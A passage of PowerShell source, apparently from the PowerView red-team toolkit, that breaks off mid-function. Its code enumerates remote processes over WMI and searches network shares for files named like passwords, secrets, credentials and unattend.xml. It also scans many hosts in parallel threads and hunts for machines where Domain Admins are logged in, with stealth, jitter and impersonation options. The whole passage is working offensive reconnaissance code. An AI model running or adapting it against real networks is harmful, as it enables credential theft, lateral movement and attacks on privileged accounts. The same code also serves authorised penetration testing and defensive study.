                                $MountedDrive | Add-Member Noteproperty 'ComputerName' $Computer
                                $MountedDrive | Add-Member Noteproperty 'UserName' $UserName
                                $MountedDrive | Add-Member Noteproperty 'UserSID' $UserSID
                                $MountedDrive | Add-Member Noteproperty 'DriveLetter' $DriveLetter
                                $MountedDrive | Add-Member Noteproperty 'ProviderName' $ProviderName
                                $MountedDrive | Add-Member Noteproperty 'RemotePath' $RemotePath
                                $MountedDrive | Add-Member Noteproperty 'DriveUserName' $DriveUserName
                                $MountedDrive.PSObject.TypeNames.Insert(0, 'PowerView.RegMountedDrive')
                                $MountedDrive
                            }
                        }
                    }
                    catch {
                        Write-Verbose "[Get-WMIRegMountedDrive] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[Get-WMIRegMountedDrive] Error accessing $Computer, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}


function Get-WMIProcess {
<#
.SYNOPSIS

Returns a list of processes and their owners on the local or remote machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Uses Get-WMIObject to enumerate all Win32_process instances on the local or remote machine,
including the owners of the particular process.

.PARAMETER ComputerName

Specifies the hostname to query for cached RDP connections (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

.EXAMPLE

Get-WMIProcess -ComputerName WINDOWS1

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-WMIProcess -ComputerName PRIMARY.testlab.local -Credential $Cred

.OUTPUTS

PowerView.UserProcess

A PSCustomObject containing the remote process information.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                $WmiArguments = @{
                    'ComputerName' = $ComputerName
                    'Class' = 'Win32_process'
                }
                if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }
                Get-WMIobject @WmiArguments | ForEach-Object {
                    $Owner = $_.getowner();
                    $Process = New-Object PSObject
                    $Process | Add-Member Noteproperty 'ComputerName' $Computer
                    $Process | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                    $Process | Add-Member Noteproperty 'ProcessID' $_.ProcessID
                    $Process | Add-Member Noteproperty 'Domain' $Owner.Domain
                    $Process | Add-Member Noteproperty 'User' $Owner.User
                    $Process.PSObject.TypeNames.Insert(0, 'PowerView.UserProcess')
                    $Process
                }
            }
            catch {
                Write-Verbose "[Get-WMIProcess] Error enumerating remote processes on '$Computer', access likely denied: $_"
            }
        }
    }
}


function Find-InterestingFile {
<#
.SYNOPSIS

Searches for files on the given path that match a series of specified criteria.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection  

.DESCRIPTION

This function recursively searches a given UNC path for files with
specific keywords in the name (default of pass, sensitive, secret, admin,
login and unattend*.xml). By default, hidden files/folders are included
in search results. If -Credential is passed, Add-RemoteConnection/Remove-RemoteConnection
is used to temporarily map the remote share.

.PARAMETER Path

UNC/local path to recursively search.

.PARAMETER Include

Only return files/folders that match the specified array of strings,
i.e. @(*.doc*, *.xls*, *.ppt*)

.PARAMETER LastAccessTime

Only return files with a LastAccessTime greater than this date value.

.PARAMETER LastWriteTime

Only return files with a LastWriteTime greater than this date value.

.PARAMETER CreationTime

Only return files with a CreationTime greater than this date value.

.PARAMETER OfficeDocs

Switch. Search for office documents (*.doc*, *.xls*, *.ppt*)

.PARAMETER FreshEXEs

Switch. Find .EXEs accessed within the last 7 days.

.PARAMETER ExcludeFolders

Switch. Exclude folders from the search results.

.PARAMETER ExcludeHidden

Switch. Exclude hidden files and folders from the search results.

.PARAMETER CheckWriteAccess

Switch. Only returns files the current user has write access to.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
to connect to remote systems for file enumeration.

.EXAMPLE

Find-InterestingFile -Path "C:\Backup\"

Returns any files on the local path C:\Backup\ that have the default
search term set in the title.

.EXAMPLE

Find-InterestingFile -Path "\\WINDOWS7\Users\" -LastAccessTime (Get-Date).AddDays(-7)

Returns any files on the remote path \\WINDOWS7\Users\ that have the default
search term set in the title and were accessed within the last week.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-InterestingFile -Credential $Cred -Path "\\PRIMARY.testlab.local\C$\Temp\"

.OUTPUTS

PowerView.FoundFile
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path = '.\',

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $Include = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastAccessTime,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastWriteTime,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,

        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $OfficeDocs,

        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $FreshEXEs,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $ExcludeFolders,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $ExcludeHidden,

        [Switch]
        $CheckWriteAccess,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments =  @{
            'Recurse' = $True
            'ErrorAction' = 'SilentlyContinue'
            'Include' = $Include
        }
        if ($PSBoundParameters['OfficeDocs']) {
            $SearcherArguments['Include'] = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }
        elseif ($PSBoundParameters['FreshEXEs']) {
            # find .exe's accessed within the last 7 days
            $LastAccessTime = (Get-Date).AddDays(-7).ToString('MM/dd/yyyy')
            $SearcherArguments['Include'] = @('*.exe')
        }
        $SearcherArguments['Force'] = -not $PSBoundParameters['ExcludeHidden']

        $MappedComputers = @{}

        function Test-Write {
            # short helper to check is the current user can write to a file
            [CmdletBinding()]Param([String]$Path)
            try {
                $Filetest = [IO.File]::OpenWrite($Path)
                $Filetest.Close()
                $True
            }
            catch {
                $False
            }
        }
    }

    PROCESS {
        ForEach ($TargetPath in $Path) {
            if (($TargetPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $HostComputer = (New-Object System.Uri($TargetPath)).Host
                if (-not $MappedComputers[$HostComputer]) {
                    # map IPC$ to this computer if it's not already
                    Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
                    $MappedComputers[$HostComputer] = $True
                }
            }

            $SearcherArguments['Path'] = $TargetPath
            Get-ChildItem @SearcherArguments | ForEach-Object {
                # check if we're excluding folders
                $Continue = $True
                if ($PSBoundParameters['ExcludeFolders'] -and ($_.PSIsContainer)) {
                    Write-Verbose "Excluding: $($_.FullName)"
                    $Continue = $False
                }
                if ($LastAccessTime -and ($_.LastAccessTime -lt $LastAccessTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters['LastWriteTime'] -and ($_.LastWriteTime -lt $LastWriteTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters['CreationTime'] -and ($_.CreationTime -lt $CreationTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters['CheckWriteAccess'] -and (-not (Test-Write -Path $_.FullName))) {
                    $Continue = $False
                }
                if ($Continue) {
                    $FileParams = @{
                        'Path' = $_.FullName
                        'Owner' = $((Get-Acl $_.FullName).Owner)
                        'LastAccessTime' = $_.LastAccessTime
                        'LastWriteTime' = $_.LastWriteTime
                        'CreationTime' = $_.CreationTime
                        'Length' = $_.Length
                    }
                    $FoundFile = New-Object -TypeName PSObject -Property $FileParams
                    $FoundFile.PSObject.TypeNames.Insert(0, 'PowerView.FoundFile')
                    $FoundFile
                }
            }
        }
    }

    END {
        # remove the IPC$ mappings
        $MappedComputers.Keys | Remove-RemoteConnection
    }
}


########################################################
#
# 'Meta'-functions start below
#
########################################################

function New-ThreadedFunction {
    # Helper used by any threaded host enumeration functions
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [String[]]
        $ComputerName,

        [Parameter(Position = 1, Mandatory = $True)]
        [System.Management.Automation.ScriptBlock]
        $ScriptBlock,

        [Parameter(Position = 2)]
        [Hashtable]
        $ScriptParameters,

        [Int]
        [ValidateRange(1,  100)]
        $Threads = 20,

        [Switch]
        $NoImports
    )

    BEGIN {
        # Adapted from:
        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
        $SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()

        # # $SessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
        # force a single-threaded apartment state (for token-impersonation stuffz)
        $SessionState.ApartmentState = [System.Threading.ApartmentState]::STA

        # import the current session state's variables and functions so the chained PowerView
        #   functionality can be used by the threaded blocks
        if (-not $NoImports) {
            # grab all the current variables for this runspace
            $MyVars = Get-Variable -Scope 2

            # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
            $VorbiddenVars = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')

            # add Variables from Parent Scope (current runspace) into the InitialSessionState
            ForEach ($Var in $MyVars) {
                if ($VorbiddenVars -NotContains $Var.Name) {
                $SessionState.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }

            # add Functions from current runspace to the InitialSessionState
            ForEach ($Function in (Get-ChildItem Function:)) {
                $SessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
            }
        }

        # threading adapted from
        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
        #   Thanks Carlos!

        # create a pool of maxThread runspaces
        $Pool = [RunspaceFactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)
        $Pool.Open()

        # do some trickery to get the proper BeginInvoke() method that allows for an output queue
        $Method = $Null
        ForEach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq 'BeginInvoke' }) {
            $MethodParameters = $M.GetParameters()
            if (($MethodParameters.Count -eq 2) -and $MethodParameters[0].Name -eq 'input' -and $MethodParameters[1].Name -eq 'output') {
                $Method = $M.MakeGenericMethod([Object], [Object])
                break
            }
        }

        $Jobs = @()
        $ComputerName = $ComputerName | Where-Object {$_ -and $_.Trim()}
        Write-Verbose "[New-ThreadedFunction] Total number of hosts: $($ComputerName.count)"

        # partition all hosts from -ComputerName into $Threads number of groups
        if ($Threads -ge $ComputerName.Length) {
            $Threads = $ComputerName.Length
        }
        $ElementSplitSize = [Int]($ComputerName.Length/$Threads)
        $ComputerNamePartitioned = @()
        $Start = 0
        $End = $ElementSplitSize

        for($i = 1; $i -le $Threads; $i++) {
            $List = New-Object System.Collections.ArrayList
            if ($i -eq $Threads) {
                $End = $ComputerName.Length
            }
            $List.AddRange($ComputerName[$Start..($End-1)])
            $Start += $ElementSplitSize
            $End += $ElementSplitSize
            $ComputerNamePartitioned += @(,@($List.ToArray()))
        }

        Write-Verbose "[New-ThreadedFunction] Total number of threads/partitions: $Threads"

        ForEach ($ComputerNamePartition in $ComputerNamePartitioned) {
            # create a "powershell pipeline runner"
            $PowerShell = [PowerShell]::Create()
            $PowerShell.runspacepool = $Pool

            # add the script block + arguments with the given computer partition
            $Null = $PowerShell.AddScript($ScriptBlock).AddParameter('ComputerName', $ComputerNamePartition)
            if ($ScriptParameters) {
                ForEach ($Param in $ScriptParameters.GetEnumerator()) {
                    $Null = $PowerShell.AddParameter($Param.Name, $Param.Value)
                }
            }

            # create the output queue
            $Output = New-Object Management.Automation.PSDataCollection[Object]

            # kick off execution using the BeginInvok() method that allows queues
            $Jobs += @{
                PS = $PowerShell
                Output = $Output
                Result = $Method.Invoke($PowerShell, @($Null, [Management.Automation.PSDataCollection[Object]]$Output))
            }
        }
    }

    END {
        Write-Verbose "[New-ThreadedFunction] Threads executing"

        # continuously loop through each job queue, consuming output as appropriate
        Do {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
            }
            Start-Sleep -Seconds 1
        }
        While (($Jobs | Where-Object { -not $_.Result.IsCompleted }).Count -gt 0)

        $SleepSeconds = 100
        Write-Verbose "[New-ThreadedFunction] Waiting $SleepSeconds seconds for final cleanup..."

        # cleanup- make sure we didn't miss anything
        for ($i=0; $i -lt $SleepSeconds; $i++) {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
                $Job.PS.Dispose()
            }
            Start-Sleep -S 1
        }

        $Pool.Dispose()
        Write-Verbose "[New-ThreadedFunction] all threads completed"
    }
}


function Find-DomainUserLocation {
<#
.SYNOPSIS

Finds domain machines where specific users are logged into.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainFileServer, Get-DomainDFSShare, Get-DomainController, Get-DomainComputer, Get-DomainUser, Get-DomainGroupMember, Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NetSession, Test-AdminAccess, Get-NetLoggedon, Resolve-IPAddress, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and queries the domain for users of a specified group
(default 'Domain Admins') with Get-DomainGroupMember. Then for each server the
function enumerates any active user sessions with Get-NetSession/Get-NetLoggedon
The found user list is compared against the target list, and any matches are
displayed. If -ShowAll is specified, all results are displayed instead of
the filtered set. If -Stealth is specified, then likely highly-trafficed servers
are enumerated with Get-DomainFileServer/Get-DomainController, and session
enumeration is executed only against those servers. If -Credential is passed,
then Invoke-UserImpersonation is used to impersonate the specified user
before enumeration, reverting after with Invoke-RevertToSelf.

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER Domain

Specifies the domain to query for computers AND users, defaults to the current domain.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.

.PARAMETER ComputerUnconstrained

Switch. Search computer objects that have unconstrained delegation.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER UserIdentity

Specifies one or more user identities to search for.

.PARAMETER UserDomain

Specifies the domain to query for users to search for, defaults to the current domain.

.PARAMETER UserLDAPFilter

Specifies an LDAP query string that is used to search for target users.

.PARAMETER UserSearchBase

Specifies the LDAP source to search through for target users.
e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.

.PARAMETER UserGroupIdentity

Specifies a group identity to query for target users, defaults to 'Domain Admins.
If any other user specifications are set, then UserGroupIdentity is ignored.

.PARAMETER UserAdminCount

Switch. Search for users users with '(adminCount=1)' (meaning are/were privileged).

.PARAMETER UserAllowDelegation

Switch. Search for user accounts that are not marked as 'sensitive and not allowed for delegation'.

.PARAMETER CheckAccess

Switch. Check if the current user has local admin access to computers where target users are found.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER StopOnSuccess

Switch. Stop hunting after finding after finding a target user.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER ShowAll

Switch. Return all user location results instead of filtering based on target
specifications.

.PARAMETER Stealth

Switch. Only enumerate sessions from connonly used target servers.

.PARAMETER StealthSource

The source of target servers to use, 'DFS' (distributed file servers),
'DC' (domain controllers), 'File' (file servers), or 'All' (the default).

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-DomainUserLocation

Searches for 'Domain Admins' by enumerating every computer in the domain.

.EXAMPLE

Find-DomainUserLocation -Stealth -ShowAll

Enumerates likely highly-trafficked servers, performs just session enumeration
against each, and outputs all results.

.EXAMPLE

Find-DomainUserLocation -UserAdminCount -ComputerOperatingSystem 'Windows 7*' -Domain dev.testlab.local

Enumerates Windows 7 computers in dev.testlab.local and returns user results for privileged
users in dev.testlab.local.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-DomainUserLocation -Domain testlab.local -Credential $Cred

Searches for domain admin locations in the testlab.local using the specified alternate credentials.

.OUTPUTS

PowerView.UserLocation
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserLocation')]
    [CmdletBinding(DefaultParameterSetName = 'UserGroupIdentity')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [Alias('Unconstrained')]
        [Switch]
        $ComputerUnconstrained,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,

        [Parameter(ParameterSetName = 'UserGroupIdentity')]
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',

        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,

        [Alias('AllowDelegation')]
        [Switch]
        $UserAllowDelegation,

        [Switch]
        $CheckAccess,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Parameter(ParameterSetName = 'ShowAll')]
        [Switch]
        $ShowAll,

        [Switch]
        $Stealth,

        [String]
        [ValidateSet('DFS', 'DC', 'File', 'All')]
        $StealthSource = 'All',

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {

        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $ComputerSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        $UserSearcherArguments = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $UserSearcherArguments['Identity'] = $UserIdentity }
        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['UserDomain']) { $UserSearcherArguments['Domain'] = $UserDomain }
        if ($PSBoundParameters['UserLDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $UserLDAPFilter }
        if ($PSBoundParameters['UserSearchBase']) { $UserSearcherArguments['SearchBase'] = $UserSearchBase }
        if ($PSBoundParameters['UserAdminCount']) { $UserSearcherArguments['AdminCount'] = $UserAdminCount }
        if ($PSBoundParameters['UserAllowDelegation']) { $UserSearcherArguments['AllowDelegation'] = $UserAllowDelegation }
        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }

        $TargetComputers = @()

        # first, build the set of computers to enumerate
        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = @($ComputerName)
        }
        else {
            if ($PSBoundParameters['Stealth']) {
                Write-Verbose "[Find-DomainUserLocation] Stealth enumeration using source: $StealthSource"
                $TargetComputerArrayList = New-Object System.Collections.ArrayList

                if ($StealthSource -match 'File|All') {
                    Write-Verbose '[Find-DomainUserLocation] Querying for file servers'
                    $FileServerSearcherArguments = @{}
                    if ($PSBoundParameters['Domain']) { $FileServerSearcherArguments['Domain'] = $Domain }
                    if ($PSBoundParameters['ComputerDomain']) { $FileServerSearcherArguments['Domain'] = $ComputerDomain }
                    if ($PSBoundParameters['ComputerSearchBase']) { $FileServerSearcherArguments['SearchBase'] = $ComputerSearchBase }
                    if ($PSBoundParameters['Server']) { $FileServerSearcherArguments['Server'] = $Server }
                    if ($PSBoundParameters['SearchScope']) { $FileServerSearcherArguments['SearchScope'] = $SearchScope }
                    if ($PSBoundParameters['ResultPageSize']) { $FileServerSearcherArguments['ResultPageSize'] = $ResultPageSize }
                    if ($PSBoundParameters['ServerTimeLimit']) { $FileServerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
                    if ($PSBoundParameters['Tombstone']) { $FileServerSearcherArguments['Tombstone'] = $Tombstone }
                    if ($PSBoundParameters['Credential']) { $FileServerSearcherArguments['Credential'] = $Credential }
                    $FileServers = Get-DomainFileServer @FileServerSearcherArguments
                    if ($FileServers -isnot [System.Array]) { $FileServers = @($FileServers) }
                    $TargetComputerArrayList.AddRange( $FileServers )
                }
                if ($StealthSource -match 'DFS|All') {
                    Write-Verbose '[Find-DomainUserLocation] Querying for DFS servers'
                    # # TODO: fix the passed parameters to Get-DomainDFSShare
                    # $ComputerName += Get-DomainDFSShare -Domain $Domain -Server $DomainController | ForEach-Object {$_.RemoteServerName}
                }
                if ($StealthSource -match 'DC|All') {
                    Write-Verbose '[Find-DomainUserLocation] Querying for domain controllers'
                    $DCSearcherArguments = @{
                        'LDAP' = $True
                    }
                    if ($PSBoundParameters['Domain']) { $DCSearcherArguments['Domain'] = $Domain }
                    if ($PSBoundParameters['ComputerDomain']) { $DCSearcherArguments['Domain'] = $ComputerDomain }
                    if ($PSBoundParameters['Server']) { $DCSearcherArguments['Server'] = $Server }
                    if ($PSBoundParameters['Credential']) { $DCSearcherArguments['Credential'] = $Credential }
                    $DomainControllers = Get-DomainController @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
                    if ($DomainControllers -isnot [System.Array]) { $DomainControllers = @($DomainControllers) }
                    $TargetComputerArrayList.AddRange( $DomainControllers )
                }
                $TargetComputers = $TargetComputerArrayList.ToArray()
            }
            else {
                Write-Verbose '[Find-DomainUserLocation] Querying for all computers in the domain'
                $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
            }
        }
        Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-DomainUserLocation] No hosts found to enumerate'
        }

        # get the current user so we can ignore it in the results
        if ($PSBoundParameters['Credential']) {
            $CurrentUser = $Credential.GetNetworkCredential().UserName
        }
        else {
            $CurrentUser = ([Environment]::UserName).ToLower()
        }

        # now build the user target set
        if ($PSBoundParameters['ShowAll']) {
            $TargetUsers = @()
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $GroupSearcherArguments = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $GroupSearcherArguments['Domain'] = $UserDomain }
            if ($PSBoundParameters['UserSearchBase']) { $GroupSearcherArguments['SearchBase'] = $UserSearchBase }
            if ($PSBoundParameters['Server']) { $GroupSearcherArguments['Server'] = $Server }
            if ($PSBoundParameters['SearchScope']) { $GroupSearcherArguments['SearchScope'] = $SearchScope }
            if ($PSBoundParameters['ResultPageSize']) { $GroupSearcherArguments['ResultPageSize'] = $ResultPageSize }
            if ($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
            if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }
            if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }
            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        Write-Verbose "[Find-DomainUserLocation] TargetUsers length: $($TargetUsers.Length)"
        if ((-not $ShowAll) -and ($TargetUsers.Length -eq 0)) {
            throw '[Find-DomainUserLocation] No users found to target'
        }

        # the host enumeration block we're using to enumerate all servers
        $HostEnumBlock = {
            Param($ComputerName, $TargetUsers, $CurrentUser, $Stealth, $TokenHandle)

            if ($TokenHandle) {
